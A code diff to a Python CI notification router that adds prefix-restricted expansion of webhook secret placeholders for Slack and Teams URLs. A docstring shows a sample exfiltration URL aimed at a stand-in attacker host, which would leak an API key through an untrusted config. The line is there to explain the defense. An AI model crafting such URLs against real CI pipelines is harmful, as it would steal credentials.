@@ -156,6 +156,72 @@ class MessageTemplate:
         return message
 
 
+# Webhook URLs are bearer secrets (anyone holding one can post to the channel),
+# so LZ configs reference them as ${DRIFT_WEBHOOK_*} placeholders instead of
+# committing them in plaintext. Placeholders resolve from the environment, then
+# from the WEBHOOK_SECRETS JSON blob CI injects (toJSON(secrets)).
+WEBHOOK_SECRET_PREFIX = "DRIFT_WEBHOOK_"
+_PLACEHOLDER_RE = re.compile(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}")
+
+
+def _webhook_secret_store() -> Dict[str, str]:
+    """Secrets available for placeholder expansion, filtered to the allowed prefix."""
+    store: Dict[str, str] = {}
+    blob = os.environ.get("WEBHOOK_SECRETS", "")
+    if blob:
+        try:
+            parsed = json.loads(blob)
+            if isinstance(parsed, dict):
+                store.update(
+                    {k: str(v) for k, v in parsed.items() if k.startswith(WEBHOOK_SECRET_PREFIX)}
+                )
+        except json.JSONDecodeError:
+            logger.warning("WEBHOOK_SECRETS is not valid JSON; ignoring it")
+    # Direct env vars win over the CI blob (supports local runs and overrides).
+    store.update(
+        {k: v for k, v in os.environ.items() if k.startswith(WEBHOOK_SECRET_PREFIX)}
+    )
+    return store
+
+
+def expand_webhook_secrets(url: str) -> str:
+    """Expand ${DRIFT_WEBHOOK_*} placeholders in a configured webhook URL.
+
+    The notifications block comes from the scanned LZ repo, which is untrusted
+    data: expanding arbitrary names would let a config exfiltrate any CI secret
+    (e.g. ``https://attacker.example/${ANTHROPIC_API_KEY}``). Only names starting
+    with DRIFT_WEBHOOK_ are eligible; anything else — and any eligible name with
+    no value available — fails the expansion.
+
+    Returns the expanded URL, or "" if any placeholder could not be resolved
+    (callers must treat "" as a hard failure, not "no channel configured").
+    Plain URLs without placeholders pass through unchanged.
+    """
+    if not url or "${" not in url:
+        return url
+
+    store = _webhook_secret_store()
+    unresolved: List[str] = []
+
+    def _sub(match: "re.Match[str]") -> str:
+        name = match.group(1)
+        if not name.startswith(WEBHOOK_SECRET_PREFIX):
+            logger.warning(
+                f"Refusing to expand ${{{name}}}: only {WEBHOOK_SECRET_PREFIX}* names may be used in webhook URLs"
+            )
+            unresolved.append(name)
+            return match.group(0)
+        value = store.get(name, "").strip()
+        if not value:
+            logger.warning(f"Webhook secret ${{{name}}} is not set (env var or WEBHOOK_SECRETS)")
+            unresolved.append(name)
+            return match.group(0)
+        return value
+
+    expanded = _PLACEHOLDER_RE.sub(_sub, url)
+    return "" if unresolved else expanded
+
+
 class NotificationRouter:
     """Route notifications to teams based on configuration."""
 
@@ -259,8 +325,23 @@ class NotificationRouter:
         # Get template (use platform-specific default if not provided)
         template_str = config.get("template")
 
-        # Send to Slack if configured
+        # Resolve ${DRIFT_WEBHOOK_*} placeholders. A configured channel whose
+        # secret can't be resolved is a misconfiguration: fail the team (and the
+        # CI step) rather than silently delivering nothing.
         slack_url = config.get("slack")
+        if slack_url:
+            slack_url = expand_webhook_secrets(slack_url)
+            if not slack_url:
+                logger.warning(f"{team_name}: Slack webhook secret unresolved; cannot notify")
+                success = False
+        teams_url = config.get("teams")
+        if teams_url:
+            teams_url = expand_webhook_secrets(teams_url)
+            if not teams_url:
+                logger.warning(f"{team_name}: Teams webhook secret unresolved; cannot notify")
+                success = False
+
+        # Send to Slack if configured
         if slack_url:
             template = MessageTemplate(template_str, platform="slack")
             for event in filtered_events:
@@ -273,7 +354,6 @@ class NotificationRouter:
                 logger.warning(f"{team_name}: Slack notification failed")
 
         # Send to Teams if configured
-        teams_url = config.get("teams")
         if teams_url:
             template = MessageTemplate(template_str, platform="teams")
             for event in filtered_events:
